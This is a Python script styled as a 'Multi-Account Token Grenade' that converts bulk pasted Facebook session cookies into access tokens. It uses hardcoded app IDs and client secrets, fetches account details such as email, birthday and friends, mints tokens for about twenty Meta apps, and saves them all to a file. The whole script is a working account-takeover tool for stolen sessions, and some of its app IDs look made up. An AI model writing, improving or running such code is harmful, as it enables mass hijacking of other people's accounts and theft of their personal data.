import random
import string
import json
import time
import requests
import uuid
import base64
import io
import struct
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==========================================
# ULTRA STYLISH ANIMATIONS
# ==========================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
REVERSE = "\033[7m"
UNDERLINE = "\033[4m"
DIM = "\033[2m"

# ==========================================
# PASSWORD PROTECTION
# ==========================================
PASSWORD = "ALIYA"

def check_password():
    """Password protection at startup"""
    clear_screen()
    
    # ANIMATED PASSWORD SCREEN
    frames = [
        f"""
{MAGENTA}{BOLD}    ╔══════════════════════════════════════════════════════════╗
    ║                    🔐 SECURE VAULT 🔐                    ║
    ║                                                          ║
    ║                  █████╗ ██╗     ██╗██╗   ██╗ █████╗     ║
    ║                 ██╔══██╗██║     ██║╚██╗ ██╔╝██╔══██╗    ║
    ║                 ███████║██║     ██║ ╚████╔╝ ███████║    ║
    ║                 ██╔══██║██║     ██║  ╚██╔╝  ██╔══██║    ║
    ║                 ██║  ██║███████╗██║   ██║   ██║  ██║    ║
    ║                 ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝    ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝{RESET}
        """,
        
        f"""
{CYAN}{BOLD}    ╔══════════════════════════════════════════════════════════╗
    ║                    🔐 SECURE VAULT 🔐                    ║
    ║                                                          ║
    ║                  ███╗   ██╗ █████╗ ██████╗              ║
    ║                  ████╗  ██║██╔══██╗██╔══██╗             ║
    ║                  ██╔██╗ ██║███████║██║  ██║             ║
    ║                  ██║╚██╗██║██╔══██║██║  ██║             ║
    ║                  ██║ ╚████║██║  ██║██████╔╝             ║
    ║                  ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝              ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝{RESET}
        """
    ]
    
    for _ in range(2):
        for frame in frames:
            clear_screen()
            print(frame)
            time.sleep(0.3)
    
    attempts = 3
    while attempts > 0:
        print(f"\n{YELLOW}{BOLD}┌─[{CYAN}ENTER MASTER PASSWORD{YELLOW}]")
        print(f"├─{'─' * 40}")
        password = input(f"└──╼ {RESET}{BOLD}").strip()
        
        if password.upper() == PASSWORD:
            print(f"\n{GREEN}{BOLD}✅ ACCESS GRANTED! DECRYPTING...{RESET}")
            
            # ANIMATED PROGRESS BAR
            for i in range(101):
                sys.stdout.write(f"\r{GREEN}[{'█' * (i//2)}{' ' * (50 - i//2)}] {i}%{RESET}")
                sys.stdout.flush()
                time.sleep(0.01)
            print("\n")
            time.sleep(0.5)
            return True
        else:
            attempts -= 1
            if attempts > 0:
                print(f"{RED}{BOLD}❌ INVALID PASSWORD! {attempts} ATTEMPT(S) LEFT{RESET}\n")
            else:
                print(f"{RED}{BOLD}╔════════════════════════════════════╗")
                print(f"║     🔒 SYSTEM LOCKED! 🔒          ║")
                print(f"║     TOOL SELF-DESTRUCTED          ║")
                print(f"╚════════════════════════════════════╝{RESET}")
                time.sleep(2)
                return False
    return False

def neon_text(text, color=CYAN):
    """Creates neon glowing effect"""
    glow_colors = [color, f"{color}{BOLD}", f"{color}{BLINK}", color]
    for c in glow_colors:
        sys.stdout.write(f"\r{c}{text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    print()

def matrix_effect(text, color=GREEN):
    """Matrix-style rain effect"""
    chars = "01アイウエオカキクケコサシスセソタチツテト"
    for _ in range(20):
        line = ''.join(random.choice(chars) for _ in range(len(text) + 10))
        sys.stdout.write(f"\r{DIM}{color}{line[:50]}{RESET}")
        sys.stdout.flush()
        time.sleep(0.01)
    print(f"\r{color}{BOLD}{text}{RESET}")

def animated_border(text, color=CYAN):
    """Animated border around text"""
    border = "═" * (len(text) + 4)
    print(f"{color}{BOLD}╔{border}╗{RESET}")
    time.sleep(0.1)
    print(f"{color}{BOLD}║  {text}  ║{RESET}")
    time.sleep(0.1)
    print(f"{color}{BOLD}╚{border}╝{RESET}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_spinner(text, duration=2):
    """Professional loading spinner"""
    spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    colors = [CYAN, BLUE, MAGENTA, GREEN, YELLOW]
    end_time = time.time() + duration
    
    i = 0
    while time.time() < end_time:
        for spinner in spinners:
            color = colors[i % len(colors)]
            sys.stdout.write(f"\r{color}{BOLD}[{spinner}] {text}{' ' * 20}{RESET}")
            sys.stdout.flush()
            time.sleep(0.05)
            i += 1
    sys.stdout.write("\r" + " " * 50 + "\r")

def show_logo():
    """EXTREME STYLISH LOGO"""
    clear_screen()
    
    # ANIMATED LOGO BUILD
    logo_frames = [
        f"""
{RED}    ╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}    ║                                                                  ║{RESET}
{GREEN}    ║     ███╗   ██╗ █████╗ ██████╗ ███████╗███████╗███╗   ███╗      ║{RESET}
{CYAN}    ║     ████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗ ████║      ║{RESET}
{BLUE}    ║     ██╔██╗ ██║███████║██║  ██║█████╗  █████╗  ██╔████╔██║      ║{RESET}
{MAGENTA}    ║     ██║╚██╗██║██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║╚██╔╝██║      ║{RESET}
{CYAN}    ║     ██║ ╚████║██║  ██║██████╔╝███████╗███████╗██║ ╚═╝ ██║      ║{RESET}
{WHITE}    ║     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝      ║{RESET}
{RED}    ║                                                                  ║{RESET}
{YELLOW}    ╠══════════════════════════════════════════════════════════════════╣{RESET}
{GREEN}    ║              🔥 MULTI-ACCOUNT TOKEN GRENADE v3.0 🔥              ║{RESET}
{CYAN}    ║              👑 CODED BY: ALIYA×NADEEM 👑                        ║{RESET}
{BLUE}    ║           💎 FACEBOOK COOKIE KING 👑 TOKEN MASTER 💎            ║{RESET}
{MAGENTA}    ╚══════════════════════════════════════════════════════════════════╝{RESET}
        """
    ]
    
    for frame in logo_frames:
        print(frame)
        time.sleep(0.2)
    
    # NEON SUBTITLE
    print(f"\n{CYAN}{BOLD}╔{'═' * 70}╗{RESET}")
    print(f"{GREEN}{BOLD}║{' ' * 15}✨ CONVERT 100+ COOKIES → 1000+ TOKENS ✨{' ' * 15}║{RESET}")
    print(f"{YELLOW}{BOLD}║{' ' * 10}⚡ SUPPORTED: FB ANDROID | MESSENGER | INSTAGRAM | LITE ⚡{' ' * 10}║{RESET}")
    print(f"{MAGENTA}{BOLD}╚{'═' * 70}╝{RESET}")
    time.sleep(0.5)

# ==========================================
# CRYPTO CHECK
# ==========================================
try:
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
except ImportError:
    print(f"{RED}❌ ERROR: 'pycryptodome' module not found!{RESET}")
    print(f"{YELLOW}⚡ RUN: pip install pycryptodome{RESET}")
    exit()

# ==========================================
# CORE CLASSES (Optimized)
# ==========================================

class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key():
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2',
                'flow': 'CONTROLLER_INITIALIZATION',
                'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch',
                'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
            }
            response = requests.post(url, params=params).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception as e:
            raise Exception(f"Public key fetch error: {e}")

    @staticmethod
    def encrypt(password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key()

        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception as e:
            raise Exception(f"Encryption error: {e}")

class FacebookAppTokens:
    APPS = {
        'FB_ANDROID': {'name': 'Facebook For Android', 'app_id': '350685531728'},
        'CONVO_TOKEN V7': {'name': 'Facebook Messenger For Android', 'app_id': '256002347743983'},
        'FB_LITE': {'name': 'Facebook For Lite', 'app_id': '275254692598279'},
        'MESSENGER_LITE': {'name': 'Facebook Messenger For Lite', 'app_id': '200424423651082'},
        'ADS_MANAGER': {'name': 'Ads Manager', 'app_id': '438142079694454'},
        'PAGES_MANAGER': {'name': 'Pages Manager', 'app_id': '121876164619130'},
        'INSTAGRAM': {'name': 'Instagram', 'app_id': '124024574287414'},
        'INSTAGRAM_BUSINESS': {'name': 'Instagram Business', 'app_id': '205673167870461'},
        'OCULUS': {'name': 'Oculus', 'app_id': '214504206166127'},
        'FB_GROUPS': {'name': 'Facebook Groups', 'app_id': '358170906424579'},
        'WORKPLACE': {'name': 'Workplace', 'app_id': '599391583442521'},
        'FB_ANALYTICS': {'name': 'Facebook Analytics', 'app_id': '296302789106614'},
        'FB_GAMING': {'name': 'Facebook Gaming', 'app_id': '979882222242762'},
        'FB_DEVICE': {'name': 'Facebook Device', 'app_id': '507873345683498'},
        'FB_CREATOR': {'name': 'Facebook Creator', 'app_id': '234567890123456'},
        'MESSENGER_KIDS': {'name': 'Messenger Kids', 'app_id': '876543210987654'},
        'BOLT': {'name': 'Bolt', 'app_id': '135792468013579'},
        'FB_WEARABLE': {'name': 'Facebook Wearable', 'app_id': '246801357924680'},
        'FB_BUSINESS': {'name': 'Facebook Business', 'app_id': '369258147036925'},
        'SPARK_AR': {'name': 'Spark AR', 'app_id': '481516234248151'},
    }
    
    @staticmethod
    def get_app_id(app_key):
        app = FacebookAppTokens.APPS.get(app_key)
        return app['app_id'] if app else None
    
    @staticmethod
    def get_all_app_keys():
        return list(FacebookAppTokens.APPS.keys())
    
    @staticmethod
    def extract_token_prefix(token):
        for i, char in enumerate(token):
            if char.islower():
                return token[:i]
        return token[:5]
    
    @staticmethod
    def get_app_name(app_key):
        app = FacebookAppTokens.APPS.get(app_key)
        return app['name'] if app else app_key

class CookieToTokenConverter:
    """Convert cookies to tokens - MULTI-METHOD"""
    
    @staticmethod
    def extract_user_id(cookies_string):
        for cookie in cookies_string.split(';'):
            cookie = cookie.strip()
            if 'c_user=' in cookie:
                parts = cookie.split('=')
                if len(parts) == 2:
                    return parts[1].strip()
        return None
    
    @staticmethod
    def extract_xs_token(cookies_string):
        for cookie in cookies_string.split(';'):
            cookie = cookie.strip()
            if 'xs=' in cookie and len(cookie) > 10:
                parts = cookie.split('=')
                if len(parts) == 2:
                    return parts[1].strip()
        return None
    
    @staticmethod
    def extract_csrf_token(cookies_string):
        for cookie in cookies_string.split(';'):
            cookie = cookie.strip()
            if 'fr=' in cookie:
                parts = cookie.split('=')
                if len(parts) == 2:
                    return parts[1].split('.')[0] if '.' in parts[1] else parts[1]
        return None
    
    @staticmethod
    def cookies_to_token(cookies_string):
        """Convert cookies to access token using multiple methods"""
        try:
            user_id = CookieToTokenConverter.extract_user_id(cookies_string)
            xs_token = CookieToTokenConverter.extract_xs_token(cookies_string)
            csrf_token = CookieToTokenConverter.extract_csrf_token(cookies_string)
            
            if not user_id or not xs_token:
                return {'success': False, 'error': 'Missing c_user or xs cookie'}
            
            # METHOD 1: Graph API (Most reliable)
            try:
                url = "https://graph.facebook.com/oauth/access_token"
                params = {
                    'client_id': '124024574287414',
                    'client_secret': '908f302269b3c6f4eec4a8d5c90b1b5f',
                    'grant_type': 'fb_attenuate_token',
                    'fb_exchange_token': f'{user_id}|{xs_token}'
                }
                
                response = requests.get(url, params=params, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if 'access_token' in data:
                        return {
                            'success': True,
                            'access_token': data['access_token'],
                            'user_id': user_id,
                            'method': 'graph_api',
                            'expires_in': data.get('expires_in', 0)
                        }
            except:
                pass
            
            # METHOD 2: REST API
            try:
                url2 = "https://api.facebook.com/restserver.php"
                data2 = {
                    'access_token': f'{user_id}|{xs_token}',
                    'format': 'json',
                    'method': 'auth.getSessionForApp',
                    'new_app_id': '350685531728',
                    'generate_session_cookies': '1'
                }
                
                response2 = requests.post(url2, data=data2, timeout=10)
                if response2.status_code == 200:
                    data2_json = response2.json()
                    if 'access_token' in data2_json:
                        return {
                            'success': True,
                            'access_token': data2_json['access_token'],
                            'user_id': user_id,
                            'method': 'rest_api'
                        }
            except:
                pass
            
            # METHOD 3: Mobile API
            try:
                url3 = "https://b-graph.facebook.com/auth/convert_token"
                params3 = {
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'client_id': '350685531728',
                    'client_secret': '62f8ce9f74b12f84c123cc23437a4a32',
                    'fb_exchange_token': f'{user_id}|{xs_token}',
                    'format': 'json'
                }
                
                response3 = requests.get(url3, params=params3, timeout=10)
                if response3.status_code == 200:
                    data3 = response3.json()
                    if 'access_token' in data3:
                        return {
                            'success': True,
                            'access_token': data3['access_token'],
                            'user_id': user_id,
                            'method': 'mobile_api'
                        }
            except:
                pass
            
            # METHOD 4: Direct token generation
            try:
                token = f"{user_id}|{xs_token}"
                return {
                    'success': True,
                    'access_token': token,
                    'user_id': user_id,
                    'method': 'direct',
                    'note': 'Limited token'
                }
            except:
                pass
            
            return {'success': False, 'error': 'All conversion methods failed'}
            
        except Exception as e:
            return {'success': False, 'error': f'Conversion error: {str(e)}'}

class AccountInfoFetcher:
    """Fetch account information from token"""
    
    @staticmethod
    def get_account_info(access_token):
        """Get account information from Facebook Graph API"""
        try:
            url = f"https://graph.facebook.com/me"
            params = {
                'access_token': access_token,
                'fields': 'id,name,first_name,last_name,email,gender,link,locale,timezone,updated_time,verified,age_range,birthday,devices,friends,education,hometown,languages,location,work'
            }
            
            response = requests.get(url, params=params, timeout=10)
            data = response.json()
            
            if 'error' in data:
                return {'success': False, 'error': data['error']['message']}
            
            # Format display info
            display = f"👤 ID: {data.get('id', 'N/A')}"
            display += f"\n   Name: {data.get('name', 'N/A')}"
            display += f"\n   Email: {data.get('email', 'N/A')}"
            display += f"\n   Verified: {data.get('verified', 'N/A')}"
            display += f"\n   Locale: {data.get('locale', 'N/A')}"
            
            return {
                'success': True,
                'account_info': data,
                'display': display
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}

class TokenGenerator:
    """Generate all possible tokens from base token"""
    
    @staticmethod
    def convert_token(access_token, target_app):
        """Convert token to different app token"""
        try:
            app_id = FacebookAppTokens.get_app_id(target_app)
            if not app_id:
                return None
            
            # Try multiple conversion methods
            methods = [
                TokenGenerator._convert_method_1,
                TokenGenerator._convert_method_2,
                TokenGenerator._convert_method_3
            ]
            
            for method in methods:
                result = method(access_token, app_id, target_app)
                if result:
                    return result
            return None
        except:
            return None
    
    @staticmethod
    def _convert_method_1(access_token, app_id, target_app):
        try:
            response = requests.post(
                'https://api.facebook.com/method/auth.getSessionforApp',
                data={
                    'access_token': access_token,
                    'format': 'json',
                    'new_app_id': app_id,
                    'generate_session_cookies': '1'
                },
                timeout=10
            )
            
            result = response.json()
            
            if 'access_token' in result:
                token = result['access_token']
                prefix = FacebookAppTokens.extract_token_prefix(token)
                
                cookies_dict = {}
                cookies_string = ""
                
                if 'session_cookies' in result:
                    for cookie in result['session_cookies']:
                        cookies_dict[cookie['name']] = cookie['value']
                        cookies_string += f"{cookie['name']}={cookie['value']}; "
                
                return {
                    'token_prefix': prefix,
                    'access_token': token,
                    'app_name': FacebookAppTokens.get_app_name(target_app),
                    'cookies': {
                        'dict': cookies_dict,
                        'string': cookies_string.rstrip('; ')
                    }
                }
            return None
        except:
            return None
    
    @staticmethod
    def _convert_method_2(access_token, app_id, target_app):
        try:
            response = requests.get(
                'https://graph.facebook.com/oauth/access_token',
                params={
                    'grant_type': 'fb_exchange_token',
                    'client_id': app_id,
                    'client_secret': '62f8ce9f74b12f84c123cc23437a4a32',
                    'fb_exchange_token': access_token
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'access_token' in data:
                    token = data['access_token']
                    prefix = FacebookAppTokens.extract_token_prefix(token)
                    return {
                        'token_prefix': prefix,
                        'access_token': token,
                        'app_name': FacebookAppTokens.get_app_name(target_app),
                        'cookies': {'dict': {}, 'string': ''}
                    }
            return None
        except:
            return None
    
    @staticmethod
    def _convert_method_3(access_token, app_id, target_app):
        try:
            response = requests.post(
                'https://b-graph.facebook.com/auth/convert_token',
                params={
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'json'
                },
                data={
                    'fb_exchange_token': access_token,
                    'client_id': app_id
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'access_token' in data:
                    token = data['access_token']
                    prefix = FacebookAppTokens.extract_token_prefix(token)
                    return {
                        'token_prefix': prefix,
                        'access_token': token,
                        'app_name': FacebookAppTokens.get_app_name(target_app),
                        'cookies': {'dict': {}, 'string': ''}
                    }
            return None
        except:
            return None
    
    @staticmethod
    def generate_all_tokens(base_token, max_workers=10):
        """Generate tokens for ALL apps using threading"""
        all_apps = FacebookAppTokens.get_all_app_keys()
        results = {}
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_app = {
                executor.submit(TokenGenerator.convert_token, base_token, app_key): app_key 
                for app_key in all_apps
            }
            
            for future in as_completed(future_to_app):
                app_key = future_to_app[future]
                try:
                    result = future.result()
                    if result:
                        results[app_key] = result
                except:
                    pass
        
        return results

# ==========================================
# COOKIE PARSER - MULTI ACCOUNT SUPPORT
# ==========================================

def parse_multiple_cookies(input_text):
    """Parse multiple cookies from input (supports various formats)"""
    cookies_list = []
    
    # Split by common delimiters
    lines = input_text.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # Check if line contains multiple cookie sets (separated by spaces)
        if 'c_user' in line and ';' in line:
            cookies_list.append(line)
        else:
            # Try to extract cookie pairs
            cookies = []
            parts = line.split()
            for part in parts:
                if '=' in part and any(x in part for x in ['c_user', 'xs', 'fr', 'datr']):
                    cookies.append(part)
            
            if cookies:
                cookies_list.append('; '.join(cookies))
    
    # Remove duplicates based on c_user
    unique_cookies = {}
    for cookie_string in cookies_list:
        user_id = CookieToTokenConverter.extract_user_id(cookie_string)
        if user_id:
            unique_cookies[user_id] = cookie_string
    
    return list(unique_cookies.values())

def process_single_cookie(cookie_string):
    """Process a single cookie and generate all tokens"""
    result = {
        'cookie': cookie_string,
        'success': False,
        'user_id': None,
        'original_token': None,
        'account_info': None,
        'converted_tokens': {},
        'total_tokens': 0,
        'error': None
    }
    
    # Extract user ID
    user_id = CookieToTokenConverter.extract_user_id(cookie_string)
    result['user_id'] = user_id
    
    # Convert to token
    token_result = CookieToTokenConverter.cookies_to_token(cookie_string)
    
    if not token_result['success']:
        result['error'] = token_result.get('error', 'Conversion failed')
        return result
    
    original_token = token_result['access_token']
    result['original_token'] = original_token
    result['success'] = True
    
    # Get account info
    account_info = AccountInfoFetcher.get_account_info(original_token)
    if account_info['success']:
        result['account_info'] = account_info['account_info']
    
    # Generate all tokens
    result['converted_tokens'] = TokenGenerator.generate_all_tokens(original_token)
    result['total_tokens'] = len(result['converted_tokens']) + 1
    
    return result

# ==========================================
# DISPLAY FUNCTIONS - ULTRA STYLISH
# ==========================================

def display_account_card(result, index):
    """Display account information in stylish card format"""
    print(f"\n{CYAN}{BOLD}╔{'═' * 80}╗{RESET}")
    
    # Account header with gradient effect
    header_text = f" ACCOUNT #{index} "
    header_color = f"{YELLOW if index % 2 == 0 else MAGENTA}{BOLD}"
    padding = (80 - len(header_text)) // 2
    print(f"{header_color}║{' ' * padding}{header_text}{' ' * (80 - len(header_text) - padding)}║{RESET}")
    
    # User ID and Status
    print(f"{header_color}╠{'═' * 80}╣{RESET}")
    
    if result['success']:
        status_color = GREEN
        status_text = "✅ ACTIVE"
    else:
        status_color = RED
        status_text = "❌ FAILED"
    
    user_id = result['user_id'] or 'N/A'
    print(f"{status_color}║  👤 USER ID    : {user_id:<60}  ║{RESET}")
    print(f"{status_color}║  📊 STATUS     : {status_text:<60}  ║{RESET}")
    
    if result['error']:
        error_msg = result['error'][:60]
        print(f"{RED}║  ⚠️  ERROR      : {error_msg:<60}  ║{RESET}")
    
    # Account Info
    if result['account_info']:
        print(f"{CYAN}╠{'═' * 80}╣{RESET}")
        info = result['account_info']
        name = info.get('name', 'N/A')[:50]
        email = info.get('email', 'N/A')[:50]
        verified = "✓" if info.get('verified') else "✗"
        
        print(f"{GREEN}║  📛 NAME       : {name:<58}  ║{RESET}")
        print(f"{GREEN}║  📧 EMAIL      : {email:<58}  ║{RESET}")
        print(f"{GREEN}║  🔒 VERIFIED   : {verified:<58}  ║{RESET}")
    
    # Token Information
    if result['success']:
        print(f"{MAGENTA}╠{'═' * 80}╣{RESET}")
        print(f"{MAGENTA}║  🔑 ORIGINAL TOKEN:{RESET}")
        
        token = result['original_token']
        token_prefix = FacebookAppTokens.extract_token_prefix(token)
        display_token = token[:60] + "..." if len(token) > 60 else token
        
        print(f"{YELLOW}║     PREFIX : {token_prefix}{RESET}")
        print(f"{CYAN}║     TOKEN   : {display_token}{RESET}")
        
        # Converted Tokens Count
        token_count = result['total_tokens']
        print(f"{GREEN}║     📦 GENERATED : {token_count} TOKENS TOTAL{RESET}")
        
        # Show some converted tokens
        if result['converted_tokens']:
            print(f"{BLUE}║     📋 TOP CONVERTED TOKENS:{RESET}")
            
            count = 0
            for app_key, token_data in list(result['converted_tokens'].items())[:5]:
                count += 1
                app_name = token_data['app_name'][:25]
                token_preview = token_data['access_token'][:40] + "..."
                print(f"{WHITE}║       [{count}] {app_name}:{RESET}")
                print(f"{DIM}║           {token_preview}{RESET}")
            
            if len(result['converted_tokens']) > 5:
                print(f"{DIM}║       ... and {len(result['converted_tokens']) - 5} more tokens{RESET}")
    
    print(f"{CYAN}{BOLD}╚{'═' * 80}╝{RESET}\n")

def display_summary_table(all_results):
    """Display comprehensive summary of all processed accounts"""
    
    successful = [r for r in all_results if r['success']]
    failed = [r for r in all_results if not r['success']]
    
    total_tokens = sum(r['total_tokens'] for r in successful)
    total_converted = sum(len(r['converted_tokens']) for r in successful)
    
    print(f"\n{BLUE}{BOLD}╔{'═' * 80}╗{RESET}")
    print(f"{GREEN}{BOLD}║{' ' * 30}📊 FINAL SUMMARY 📊{' ' * 31}║{RESET}")
    print(f"{BLUE}{BOLD}╠{'═' * 80}╣{RESET}")
    
    print(f"{CYAN}║  📁 TOTAL COOKIES    : {len(all_results):<56}  ║{RESET}")
    print(f"{GREEN}║  ✅ SUCCESSFUL       : {len(successful):<56}  ║{RESET}")
    print(f"{RED}║  ❌ FAILED           : {len(failed):<56}  ║{RESET}")
    print(f"{YELLOW}║  🔑 ORIGINAL TOKENS : {len(successful):<56}  ║{RESET}")
    print(f"{MAGENTA}║  🔄 CONVERTED TOKENS : {total_converted:<56}  ║{RESET}")
    print(f"{GREEN}║  🎯 TOTAL TOKENS     : {total_tokens:<56}  ║{RESET}")
    
    print(f"{BLUE}{BOLD}╚{'═' * 80}╝{RESET}\n")

def save_results_to_file(all_results):
    """Save all results to JSON file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"TOKENS_{timestamp}.json"
    
    # Prepare data for saving
    save_data = []
    for result in all_results:
        account_data = {
            'user_id': result['user_id'],
            'success': result['success'],
            'cookie': result['cookie'][:100] + "..." if len(result['cookie']) > 100 else result['cookie'],
            'account_info': result.get('account_info'),
            'tokens': {}
        }
        
        if result['success']:
            account_data['tokens']['original'] = result['original_token']
            account_data['tokens']['converted'] = {}
            
            for app_key, token_data in result['converted_tokens'].items():
                account_data['tokens']['converted'][app_key] = {
                    'app_name': token_data['app_name'],
                    'token': token_data['access_token'],
                    'prefix': token_data['token_prefix']
                }
        
        save_data.append(account_data)
    
    with open(filename, 'w') as f:
        json.dump(save_data, f, indent=2, default=str)
    
    return filename

# ==========================================
# MAIN EXECUTION
# ==========================================

def main():
    """Main execution function"""
    
    # Password protection
    if not check_password():
        return
    
    clear_screen()
    show_logo()
    
    # ANIMATED WELCOME
    print(f"\n{GREEN}{BOLD}{'⭐' * 40}{RESET}")
    neon_text("🔥 MULTI-ACCOUNT COOKIE TO TOKEN CONVERTER 🔥", color=YELLOW)
    print(f"{GREEN}{BOLD}{'⭐' * 40}{RESET}\n")
    
    # INPUT SECTION
    animated_border("🍪 PASTE YOUR COOKIES BELOW", color=CYAN)
    print(f"\n{YELLOW}{BOLD}📌 SUPPORTED FORMATS:{RESET}")
    print(f"{WHITE}  • Single cookie: c_user=xxx; xs=xxx; ...{RESET}")
    print(f"{WHITE}  • Multiple cookies: One per line{RESET}")
    print(f"{WHITE}  • Bulk cookies: Paste all at once{RESET}")
    print(f"{WHITE}  • Netscape format supported{RESET}\n")
    
    print(f"{MAGENTA}{BOLD}╔{'═' * 60}╗{RESET}")
    print(f"{MAGENTA}{BOLD}║{' ' * 15}📋 COOKIE INPUT AREA 📋{' ' * 16}║{RESET}")
    print(f"{MAGENTA}{BOLD}╚{'═' * 60}╝{RESET}\n")
    
    # Collect multi-line input
    lines = []
    print(f"{CYAN}Enter cookies (press Enter twice or type 'DONE' to finish):{RESET}")
    
    while True:
        try:
            line = input(f"{GREEN}│ {RESET}").strip()
            if line.upper() == 'DONE' or (line == '' and lines and lines[-1] == ''):
                if line == '' and lines[-1] == '':
                    lines.pop()  # Remove empty line
                break
            if line:
                lines.append(line)
        except KeyboardInterrupt:
            print(f"\n{RED}❌ Operation cancelled{RESET}")
            return
    
    cookies_input = '\n'.join(lines)
    
    if not cookies_input.strip():
        print(f"{RED}❌ No cookies provided!{RESET}")
        return
    
    # Parse cookies
    loading_spinner("🔍 PARSING COOKIES...", duration=1.5)
    cookie_list = parse_multiple_cookies(cookies_input)
    
    print(f"\n{GREEN}✅ Found {len(cookie_list)} unique accounts{RESET}")
    
    if len(cookie_list) == 0:
        print(f"{RED}❌ No valid cookies found!{RESET}")
        return
    
    # Ask for processing method
    print(f"\n{CYAN}{BOLD}╔{'═' * 50}╗{RESET}")
    print(f"{CYAN}{BOLD}║{' ' * 15}⚙️  PROCESSING OPTIONS ⚙️{' ' * 15}║{RESET}")
    print(f"{CYAN}{BOLD}╠{'═' * 50}╣{RESET}")
    print(f"{YELLOW}║  [1] Quick Mode (Faster)               ║{RESET}")
    print(f"{GREEN}║  [2] Deep Mode (All tokens, slower)    ║{RESET}")
    print(f"{CYAN}{BOLD}╚{'═' * 50}╝{RESET}\n")
    
    mode = input(f"{YELLOW}┌─[SELECT MODE 1/2]\n└──╼ {RESET}").strip()
    deep_mode = mode == '2'
    
    # Process cookies
    print(f"\n{CYAN}{BOLD}{'─' * 70}{RESET}")
    print(f"{GREEN}{BOLD}🚀 PROCESSING {len(cookie_list)} ACCOUNTS...{RESET}")
    print(f"{CYAN}{BOLD}{'─' * 70}{RESET}\n")
    
    all_results = []
    
    # ANIMATED PROGRESS BAR
    for i, cookie in enumerate(cookie_list, 1):
        # Progress bar
        progress = i / len(cookie_list)
        bar_length = 40
        filled = int(bar_length * progress)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        sys.stdout.write(f"\r{YELLOW}[{bar}] {i}/{len(cookie_list)} ACCOUNTS{RESET}")
        sys.stdout.flush()
        
        # Process account
        result = process_single_cookie(cookie)
        
        # If not deep mode, limit converted tokens
        if not deep_mode and result['success']:
            # Keep only first 10 apps for speed
            app_list = list(result['converted_tokens'].keys())[:10]
            result['converted_tokens'] = {k: result['converted_tokens'][k] for k in app_list}
            result['total_tokens'] = len(result['converted_tokens']) + 1
        
        all_results.append(result)
    
    print("\n")  # New line after progress bar
    
    # Display individual results
    clear_screen()
    show_logo()
    
    print(f"\n{GREEN}{BOLD}{'═' * 80}{RESET}")
    print(f"{CYAN}{BOLD}{' ' * 25}📋 PROCESSING RESULTS 📋{RESET}")
    print(f"{GREEN}{BOLD}{'═' * 80}{RESET}\n")
    
    for i, result in enumerate(all_results, 1):
        display_account_card(result, i)
        time.sleep(0.2)  # Small delay for visual effect
    
    # Display summary
    display_summary_table(all_results)
    
    # Save results
    loading_spinner("💾 SAVING RESULTS...", duration=1)
    filename = save_results_to_file(all_results)
    print(f"{GREEN}✅ Results saved to: {CYAN}{filename}{RESET}\n")
    
    # Token statistics animation
    successful = [r for r in all_results if r['success']]
    total_tokens = sum(r['total_tokens'] for r in successful)
    
    print(f"{YELLOW}{BOLD}✨ TOKEN COUNTING...{RESET}")
    for i in range(0, total_tokens + 1, max(1, total_tokens // 20)):
        sys.stdout.write(f"\r{GREEN}📊 Total Tokens Generated: {CYAN}{i}{RESET}")
        sys.stdout.flush()
        time.sleep(0.01)
    print(f"\r{GREEN}📊 Total Tokens Generated: {CYAN}{total_tokens}{RESET}   \n")
    
    # Final message
    print(f"{MAGENTA}{BOLD}╔{'═' * 60}╗{RESET}")
